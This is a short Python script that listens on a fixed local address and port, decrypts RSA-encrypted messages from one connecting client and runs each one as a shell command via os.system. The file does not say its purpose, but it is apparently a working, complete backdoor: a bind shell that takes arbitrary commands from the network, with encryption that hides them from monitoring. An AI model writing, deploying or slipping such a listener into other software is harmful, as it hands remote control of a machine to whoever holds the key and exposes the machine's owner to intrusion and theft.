import socket
import os
import rsa

with open("private.pem","rb") as f:
    pk = f.read()
    private_key = rsa.PrivateKey.load_pkcs1(pk)

HOST = '192.168.1.43'
PORT = 5005


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind( (HOST,PORT) )
s.listen(1)
conn , addr  = s.accept()

print("client connected from:", addr)

while True:

    data = conn.recv(1024)
    if not data:
        break

    print(data)
    decoded_data = rsa.decrypt(data, private_key).decode('utf-8')

    print(decoded_data)
    os.system(decoded_data)

conn.close()